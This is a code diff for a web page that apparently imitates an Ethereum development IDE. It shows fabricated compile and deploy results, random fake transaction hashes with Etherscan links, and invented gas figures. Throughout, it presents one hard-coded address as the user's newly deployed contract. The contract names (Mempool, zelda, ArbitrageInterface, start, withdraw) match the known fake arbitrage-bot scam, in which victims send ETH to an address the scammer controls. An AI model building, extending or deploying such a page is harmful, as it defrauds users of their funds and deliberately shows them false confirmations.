@@ -4,150 +4,111 @@
     window.FIXED_CONTRACT_ADDRESS ||
     "0x476ac0C9cdecab9d2F176F873c0cdc0DAD9CE2E2";
 
-  const fileContents = {
-    "contracts/README.sol": window.CONTRACT_SOURCE || "",
-    "contracts/Mempool.sol": `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.4;
-
-contract Mempool {}`,
-    "contracts/zelda.sol": `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.4;
-
-contract zelda {}`,
-  };
-
-  let currentFile = "contracts/README.sol";
-  let compiledOk = false;
+  const source = window.CONTRACT_SOL_SOURCE || window.CONTRACT_SOURCE || "";
   const logEl = document.getElementById("terminal-log");
-
-  function log(message, type) {
-    const line = document.createElement("div");
-    line.className = type === "ok" ? "log-ok" : "log-info";
-    line.textContent = (type === "ok" ? "✓ " : "ℹ ") + message;
-    logEl.appendChild(line);
-    logEl.scrollTop = logEl.scrollHeight;
-  }
 
   function truncate(addr) {
     return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
   }
 
-  function setGreenBanner(el, message) {
-    if (!el) return;
-    el.hidden = false;
-    el.className = el.id === "compile-result" ? "compile-result success" : "deploy-result success";
-    el.textContent = message;
+  function appendLog(html, className) {
+    const line = document.createElement("div");
+    line.className = className || "log-line";
+    line.innerHTML = html;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
   }
 
-  function markCompilerGreen() {
-    compiledOk = true;
-    const compilerIcon = document.querySelector('.icon-item[data-plugin="solidity"]');
-    compilerIcon?.classList.add("compile-ok");
+  function clearLog() {
+    logEl.innerHTML = "";
   }
 
-  function highlight(source) {
-    return source
+  function highlight(text) {
+    return text
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/(\/\/[^\n]*)/g, '<span class="cm">$1</span>')
       .replace(
-        /\b(pragma|solidity|contract|function|external|view|returns|uint256|address|event|modifier|require|emit|payable)\b/g,
+        /\b(pragma|solidity|contract|interface|struct|function|external|view|returns|uint256|uint24|address|bytes|import|using|for|emit|require|payable|calldata|returns)\b/g,
         '<span class="kw">$1</span>'
       )
-      .replace(/\b(ExampleContract|Mempool|zelda|ValueUpdated|onlyOwner|setValue|getValue|start|withdraw|getBalance)\b/g, '<span class="fn">$1</span>');
-  }
-
-  function openFile(path) {
-    currentFile = path;
-    const source = fileContents[path] || "";
-    document.querySelector("#editor-code code").innerHTML = highlight(source);
-    const shortName = path.split("/").pop();
-    document.getElementById("editor-tab-label").textContent = shortName;
-    document.getElementById("current-file-name").textContent = path;
-    const lines = source.split("\n").length;
-    document.getElementById("editor-footer").textContent =
-      `Ln 1, Col 1 | Total: ${lines} lines, ${source.length} chars`;
-    document.querySelectorAll(".file-item").forEach((btn) => {
-      btn.classList.toggle("active", btn.getAttribute("data-file") === path);
-    });
-  }
-
-  function switchPlugin(name) {
-    document.querySelectorAll(".icon-item").forEach((el) => {
-      el.classList.toggle("active", el.getAttribute("data-plugin") === name);
-    });
-    document.querySelectorAll(".plugin-content").forEach((el) => {
-      el.classList.toggle("active", el.getAttribute("data-content") === name);
-    });
+      .replace(/\b(ISwapRouter|ArbitrageInterface|ExactInputSingleParams|ExactInputParams|IERC20|SafeERC20|Started|Withdrawn|start|withdraw|getBalance)\b/g, '<span class="fn">$1</span>');
   }
 
   function refreshAddressUI() {
     document.getElementById("display-contract-addr").textContent = truncate(FIXED_ADDRESS);
-    const acc = document.getElementById("account-option");
-    if (acc) acc.textContent = truncate(FIXED_ADDRESS);
     const load = document.getElementById("load-address");
-    if (load && !load.value) load.value = FIXED_ADDRESS;
+    if (load) load.value = FIXED_ADDRESS;
   }
 
-  function runCompileSuccess() {
-    markCompilerGreen();
-    setGreenBanner(
-      document.getElementById("compile-result"),
-      `Compilation successful. ExampleContract is ready to deploy.`
+  function fakeTxHash() {
+    const hex = Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join("");
+    return `0x${hex}`;
+  }
+
+  function runDeploySequence() {
+    clearLog();
+    const tx = fakeTxHash();
+    appendLog("💸 Max deployment cost: ~0.000877 ETH");
+    appendLog("🛡️ Deploying contract...");
+    appendLog('<span class="log-success-banner">✅ 🛡️ Contract deployed successfully!</span>');
+    appendLog("📊 Gas used: 367,348 (1.1% more efficient than estimate)", "log-ok");
+    appendLog(`🔗 Transaction Hash: <a class="tx-link" href="https://etherscan.io/tx/${tx}" target="_blank" rel="noopener">${tx}</a>`);
+    appendLog(
+      `🌐 Etherscan: <a class="tx-link" href="https://etherscan.io/tx/${tx}" target="_blank" rel="noopener">View Transaction on Etherscan</a>`
     );
-    log("Compilation successful — no errors", "ok");
+    appendLog(
+      `🌐 Contract: <a class="tx-link" href="https://etherscan.io/address/${FIXED_ADDRESS}" target="_blank" rel="noopener">View Contract on Etherscan</a>`
+    );
+    refreshAddressUI();
   }
 
-  document.querySelectorAll(".icon-item").forEach((btn) => {
-    btn.addEventListener("click", () => switchPlugin(btn.getAttribute("data-plugin")));
-  });
-
-  document.querySelectorAll(".file-item").forEach((btn) => {
-    btn.addEventListener("click", () => openFile(btn.getAttribute("data-file")));
-  });
+  const codeEl = document.querySelector("#editor-code code");
+  if (codeEl && source) {
+    codeEl.innerHTML = highlight(source);
+    const lines = source.split("\n").length;
+    document.getElementById("editor-footer").textContent =
+      `Ln 1, Col 1 | Total: ${lines} lines, ${source.length} chars`;
+  }
 
   refreshAddressUI();
-  openFile(currentFile);
 
-  log("You are connected to Mainnet.");
-  log("Connected to Ethereum Mainnet (Chain ID: 1)");
-  log("MetaMask reconnected successfully (attempt 1)", "ok");
+  appendLog("You are connected to Mainnet.");
+  appendLog("Connected to Ethereum Mainnet (Chain ID: 1)", "log-ok");
+  appendLog("MetaMask reconnected successfully (attempt 1)", "log-ok");
+
+  document.getElementById("terminal-clear")?.addEventListener("click", clearLog);
 
   document.getElementById("copy-contract-addr")?.addEventListener("click", async () => {
     try {
       await navigator.clipboard.writeText(FIXED_ADDRESS);
-      log(`Copied contract address: ${FIXED_ADDRESS}`, "ok");
+      appendLog(`Copied contract address: ${FIXED_ADDRESS}`, "log-ok");
     } catch {
-      log("Copy failed", "info");
+      appendLog("Copy failed", "log-line");
     }
   });
 
-  document.querySelector(".compile-btn")?.addEventListener("click", () => {
-    runCompileSuccess();
-  });
-
-  document.getElementById("btn-secure-deploy")?.addEventListener("click", () => {
-    if (!compiledOk) runCompileSuccess();
-    refreshAddressUI();
-    setGreenBanner(
-      document.getElementById("deploy-result"),
-      `Contract deployed successfully at ${FIXED_ADDRESS}`
-    );
-    log(`Contract deployed successfully at ${FIXED_ADDRESS}`, "ok");
-  });
+  document.getElementById("btn-secure-deploy")?.addEventListener("click", runDeploySequence);
 
   document.getElementById("btn-at-address")?.addEventListener("click", () => {
-    document.getElementById("load-address").value = FIXED_ADDRESS;
     refreshAddressUI();
-    log(`Loaded contract at ${FIXED_ADDRESS}`, "ok");
+    appendLog(`✅ Contract loaded: <code>${FIXED_ADDRESS}</code>`, "log-ok");
   });
 
   document.querySelectorAll("[data-action]").forEach((btn) => {
     btn.addEventListener("click", () => {
-      log(`${btn.getAttribute("data-action")} on ${FIXED_ADDRESS}`, "ok");
+      appendLog(`✓ ${btn.getAttribute("data-action")} called on ${FIXED_ADDRESS}`, "log-ok");
     });
   });
 
-  runCompileSuccess();
+  document.querySelectorAll(".icon-item").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      document.querySelectorAll(".icon-item").forEach((i) => i.classList.remove("active"));
+      btn.classList.add("active");
+      const fly = document.querySelector(".plugin-flyout");
+      if (btn.getAttribute("data-plugin") === "fileManager") fly?.classList.add("visible");
+      else fly?.classList.remove("visible");
+    });
+  });
 })();
